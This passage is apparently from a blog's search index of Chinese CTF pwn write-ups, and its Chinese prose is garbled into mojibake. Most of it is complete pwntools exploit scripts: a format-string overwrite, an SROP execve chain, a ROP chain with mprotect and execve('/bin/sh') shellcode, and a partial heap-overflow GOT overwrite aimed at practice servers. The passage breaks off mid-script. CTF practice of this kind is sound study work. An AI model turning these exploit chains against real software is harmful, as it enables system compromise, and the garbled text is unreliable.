ˆé¡¶å‰ä¸¤ä¸ªæ•°æ®åˆ†åˆ«æ˜¯formatå­—ç¬¦ä¸²å’Œç¬¬1ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¿å­˜åœ¨ç¬¬11ä¸ªå‚æ•°çš„ä½ç½®ï¼Œå› æ­¤åç§»å°±æ˜¯11\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²äº†ï¼š\næˆ‘ä»¬çš„ç›®çš„æ˜¯å‘æˆ‘ä»¬è¾“å…¥çš„åœ°å€å¤„å†™å…¥æ•°æ®4ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„åœ°å€æ˜¯ä¿å­˜åœ¨ç¬¬åä¸€ä¸ªå‚æ•°çš„ä½ç½®çš„ï¼Œè€Œä¸”åˆšåˆšå¥½32ä½çš„åœ°å€å ç”¨å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ï¼š\npayload = pg(0x804a02c) + b\u0026#34;%11$n\u0026#34; å¦‚æœæƒ³æŠŠåœ°å€æ”¾åœ¨åé¢ï¼Œå› ä¸º\u0026quot;%11$n\u0026quot;å ç”¨5ä¸ªå­—ç¬¦ï¼Œä¸ºäº†è¾“å…¥4æˆ‘ä»¬éœ€è¦åœ¨å…¶å‰é¢å¡«å……4ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ç°åœ¨ä¸€å…±å ç”¨9ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«å……3ä¸ªåƒåœ¾æ•°æ®è®©å®ƒå ç”¨è¾¾åˆ°12ä¸ªå­—ç¬¦ï¼Œè®©æˆ‘ä»¬çš„åœ°å€åœ¨ç¬¬14ä¸ªå‚æ•°çš„ä½ç½®ï¼š\npayload = b\u0026#34;aaaa%14$n!!!\u0026#34; + pg(0x804a02c) æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨pwntoolsæä¾›çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼š\n# ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åç§»é‡ï¼Œä¹Ÿå°±æ˜¯11 # ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œkeyä¸ºéœ€è¦æ›´æ”¹çš„å˜é‡ï¼ˆå‡½æ•°ï¼‰åœ°å€ï¼Œvalä¸ºéœ€è¦æ›´æ”¹çš„å€¼ payload = fmtstr_payload(11, {0x804A02C: 0x4}) å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./fm\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) p.clean() payload = fmtstr_payload(11, {0x804A02C: 0x4}) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/","section":"writeup","summary":"Never complain and never explain. â€” Benjamin Disraeli åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $","tags":["pwn","æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"],"title":"ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‘jarvisoj_fmm"},{"categories":["writeup"],"contents":" Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. â€” NiccolÃ² Machiavelli\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  è¿™é‡Œæœ‰ä¸¤ä¸ªsyscallç”¨äºè¯»å†™ï¼Œå·²ç»å¾ˆæ˜æ˜¾åœ°æš—ç¤ºè¦ç”¨syscalläº†\næ¥ä¸‹æ¥å®ƒåˆæä¾›äº†ä¸€ä¸ªgadgetå‡½æ•°ï¼Œæ˜æ˜¾æ˜¯è¦ä¸ºsig_returnåšå¥½å‰ç½®å·¥ä½œï¼ˆè®¾ç½®RAXï¼‰\né‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œå…ˆè°ƒç”¨sig_returnï¼Œè¿™æ ·å®ƒå°±ä¼šæŠŠæ¥ä¸‹æ¥æˆ‘ä»¬å®‰æ’åœ¨æ ˆä¸Šçš„ä¸Šä¸‹æ–‡ä½œä¸ºæ¥ä¸‹æ¥è¦æ¢å¤çš„ä¸Šä¸‹æ–‡ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®‰æ’ç³»ç»Ÿçš„å¯„å­˜å™¨äº†\næ„å»ºexp é¦–å…ˆç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ä¼šæ‰“å°å‡ºæ¥rbpçš„åœ°å€ï¼Œä¸ºäº†è®©ç¨‹åºå†è¿è¡Œä¸€éï¼Œæˆ‘ä»¬å°†retåœ°å€è®¾ç½®ä¸ºvulå‡½æ•°çš„åœ°å€ï¼š\nstack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset é€šè¿‡è°ƒè¯•æ—¶çš„åç§»è®¡ç®—ï¼Œæˆ‘ä»¬å°±è·å¾—äº†æ ˆåœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºsig_returnåæ¢å¤çš„ä¸Šä¸‹æ–‡äº†\nsig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # ä½¿ç”¨pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºæˆ‘ä»¬æƒ³è¦çš„ä¸Šä¸‹æ–‡ frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) ç„¶åæŒ‰sig_return+ä¸Šä¸‹æ–‡çš„æ ¼å¼å‘è¿‡å»å°±å¯ä»¥äº†ï¼š\np.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) å®Œæ•´exp from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_s_3\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28554\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) stack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset p.clean() sig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # ä½¿ç”¨pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºæˆ‘ä»¬æƒ³è¦çš„ä¸Šä¸‹æ–‡ frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/","section":"writeup","summary":"Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. â€” NiccolÃ² Machiavelli åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checkse","tags":["pwn","åŸºç¡€SROP","sig_return"],"title":"ã€åŸºç¡€SROPã€‘ã€sig_returnã€‘ciscn_s_3"},{"categories":["writeup"],"contents":" You can\u0026rsquo;t choose up sides on a round world. â€” Wayne Dyer\né¢˜ç›®é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ ä¸æ˜¯åŠ¨æ€é“¾æ¥ç¨‹åº\nidaæŸ¥çœ‹ä¼ªä»£ç  è§£æ³•ä¸€ è¯¥é¢˜æ²¡æœ‰systemä¹Ÿæ²¡æœ‰/bin/shï¼Œä¹Ÿä¸èƒ½ret2libcï¼Œä¹Ÿæ²¡æœ‰syscallï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨int 80hæ¥åŸå§‹åœ°è°ƒç”¨0xbå·ç³»ç»Ÿè°ƒç”¨ï¼ˆexecveï¼‰ å› ä¸ºé•¿åº¦é™åˆ¶ä¸º100ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ropperæˆ–ROPgadgetè‡ªåŠ¨ç”Ÿæˆçš„ropchainï¼ˆå¤ªé•¿äº†ï¼‰ï¼Œæ‰€ä»¥éœ€è¦æ‰‹å†™ropchainæ¥æ·»åŠ åˆ©ç”¨ç‡æ›´é«˜çš„gadget\n#!/usr/bin/python2 #coding=utf-8 from pwn import * from LibcSearcher import * context(os = \u0026#34;linux\u0026#34;, arch = \u0026#34;i386\u0026#34;, log_level= \u0026#34;debug\u0026#34;) p = remote(\u0026#34;node3.buuoj.cn\u0026#34;, 28443) read_addr = 0x0806cd50 int_80 = 0x080493e1 pop_eax_ret = 0x080bae06 pop_edx_ecx_eax_ret = 0x0806e850 bss_addr = 0x080eb584 payload = \u0026#34;a\u0026#34; * 0x20 + p32(read_addr) payload += p32(pop_edx_ecx_eax_ret)\t# å¹³è¡¡æ ˆç©ºé—´ payload += p32(0) + p32(bss_addr) + p32(8)\t# readå‡½æ•°çš„ä¸‰ä¸ªå‚æ•° payload += p32(pop_eax_ret) + p32(0x0b)\t# å¯¹eaxè¿›è¡Œèµ‹å€¼ # å¯¹edxã€ecxã€ebxè¿›è¡Œèµ‹å€¼ payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr) payload += p32(int_80) p.sendlineafter(\u0026#34;:\u0026#34;, payload) p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.sendline(\u0026#34;cat flag\u0026#34;) p.interactive() è§£æ³•äºŒ è°ƒç”¨mprotectå‡½æ•°è®¾ç½®ä¸€æ®µå†…å­˜çš„å¯æ‰§è¡Œæƒé™ï¼Œç„¶åå†™å…¥shellcode éœ€è¦æ³¨æ„çš„æ˜¯mprotectå‚æ•°ä¸­å†…å­˜çš„èµ·å§‹åœ°å€éœ€è¦æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æœ«ä¸‰ä½éœ€è¦æ˜¯0\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./simplerop\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25133\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x80EAF85 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 8 pop_edx_ecx_ebx_ret = 0x0806e850 bss = 0x80EB000 ret = 0x080481b2 payload = flat({offset:[ m_elf.sym[\u0026#39;mprotect\u0026#39;], pop_edx_ecx_ebx_ret, bss, 0x1000, 0b111, m_elf.sym[\u0026#39;read\u0026#39;], pop_edx_ecx_ebx_ret, 0, bss, 0x100, bss ]}) sendline_after_clean(payload) # sleep(0.1) shellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sendline_after_clean(flat(shellcode_32)) # sleep(0.1) # payload = flat({offset:bss}) # sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/","section":"writeup","summary":"You can\u0026rsquo;t choose up sides on a round world. â€” Wayne Dyer é¢˜ç›®é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ ä¸æ˜¯åŠ¨æ€é“¾æ¥ç¨‹åº idaæŸ¥çœ‹ä¼ªä»£ç  è§£æ³•ä¸€ è¯¥é¢˜æ²¡æœ‰systemä¹Ÿæ²¡æœ‰/bin/shï¼Œä¹Ÿä¸èƒ½ret2libcï¼Œä¹Ÿ","tags":["pwn","åˆ©ç”¨mprotectå‡½æ•°","åˆ©ç”¨int 80h"],"title":"ã€åˆ©ç”¨int 80hã€‘ã€åˆ©ç”¨mprotectå‡½æ•°ã€‘BUUCTF cmcc_simplerop"},{"categories":["writeup"],"contents":" In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. â€” Eric Hoffer\nåŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å¯ä»¥çœ‹åˆ°æ˜¯æ ‡å‡†çš„èœå•å †é¢˜\nallocate è¿™é‡Œè‡ªå®šä¹‰äº†ç»“æ„ä½“ åœ¨endså¤„æŒ‰dæ–°å»ºåŸŸï¼Œå…‰æ ‡åœ¨å…·ä½“çš„åŸŸä¸ŠæŒ‰dä¼šæ¸…ç©º è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ç”³è¯·äº†ä¸¤ç‰‡å†…å­˜ï¼š\nç»“æ„ä½“å›ºæœ‰çš„0x80å­—èŠ‚çš„å†…å­˜ï¼Œç¬¬ä¸€ä¸ªåŸŸæ˜¯å­˜æ”¾ç¬¬äºŒç‰‡å†…å­˜çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªåŸŸç”¨äºå­˜æ”¾ä¸€ä¸ªname ç¬¬äºŒç‰‡å†…å­˜çš„å¤§å°æ˜¯ä»»æ„çš„ï¼Œä½†æ˜¯è¿™é‡Œå®ƒé™åˆ¶ptr_content + input_sizeçš„å€¼ä¸èƒ½å¤§äºç¬¬ä¸€ä¸ªåŸŸçš„å†…å­˜åœ°å€ å› ä¸ºptr_contentçš„å†…å­˜å…ˆç”³è¯·ï¼Œnameçš„å†…å­˜åç”³è¯·ï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰freeçš„æƒ…å†µä¸‹ï¼Œptr_contentçš„å†…å­˜åœ°å€æ€»æ˜¯å°äºnameçš„å¹¶ä¸”ç´§å¯†ç›¸è¿çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æµ‹æ€»æ˜¯èƒ½å¤Ÿä¿è¯ä¸æº¢å‡ºçš„ è¿™é‡Œæ˜æ˜¾æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ä¸¤å—å†…å­˜freeåˆ°unsorted binä¸­ï¼Œå†ç”³è¯·ä¸€å—å¤§å°ç­‰äºä¸¤å—å†…å­˜å¤§å°ä¹‹å’Œçš„å†…å­˜ä½œä¸ºptr_contentçš„åœ°å€ï¼Œè¿™æ ·nameç”³è¯·çš„å†…å­˜åœ°å€å°±ä¼šä»top_chunkä¸­åˆ‡å‡ºï¼Œä¸¤è€…ä¸­é—´çš„ä¸€ä¸²chunkå°±éƒ½å¯ä»¥æº¢å‡ºäº† remove ç”¨ä¸äº†UAFï¼Œä¹Ÿä¸èƒ½é€šè¿‡freeåˆ°unsorted binä¸­è·å–libc\nshow å¯ä»¥å°†ptr_contentçš„å€¼æ”¹ä¸ºfreeçš„gotå€¼ï¼Œç„¶åå°±èƒ½è·å¾—freeçš„åœ°å€äº†\nchange åªæ›´æ–°ptr_contenté‡Œçš„å€¼\nexp é€šè¿‡æº¢å‡ºæ”¹å˜ptr_contentçš„å€¼ä¸ºfree_gotï¼Œç„¶åshowå‡ºfreeçš„åœ°å€ï¼Œè®¡ç®—å¾—åˆ°systemåœ°å€ï¼Œæ”¹å˜free_gotå€¼ä¸ºsystemåœ°å€å³å¯\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./babyfengshui_33c3_2016\u0026#34; libc_name: str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;27439\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, name: bytes, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;0\u0026#34;) sendline_after_clean(str(size)) sendline_after_clean(name) sendline_after_clean(str(len(content))) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) def show(index: int) -\u0026gt; bytes: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) p.recvuntil(b\u0026#34;name: \u0026#34;) received = {} received[\u0026#39;name\u0026#39;] = p.recvline() p.recvuntil(b\u0026#34;description: \u0026#34;) received[\u0026#39;description\u0026#39;] = p.recv(4) print(received) return received def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) sendline_after_clean(content) allocate(0x80, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;) # 0 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 1 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 